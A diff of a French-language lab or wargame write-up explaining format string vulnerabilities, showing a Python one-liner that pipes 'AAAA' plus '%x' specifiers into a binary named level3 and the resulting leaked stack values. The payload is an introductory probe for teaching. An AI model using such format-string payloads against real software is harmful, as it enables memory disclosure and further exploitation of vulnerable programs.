@@ -14,9 +14,9 @@ Si on ne donne pas explicitement d'arguments variadiques apres avoir indique un 
 
 Exemple avec le binaire level3:
 
-`(python -c 'print "AAAA" + ".%x"*8') | ./level3`
+`(python -c 'print "AAAA" + " %x"*5') | ./level3`
 
--> `AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e.252e7825.78252e78.2e78252e`
+-> `AAAA 200 b7fd1ac0 b7ff37d0 41414141 2e78252e`
 
 printf() affiche notre chaine "AAAA" puis cherche les arguments affilies aux formats. Vu qu'on ne lui a pas fournis ces arguments, printf() ce contente d'afficher ce qu'il a sous la main, dans la pile.
 Et surprise, on retrouve notre chaine "AAAA" -> "41414141".
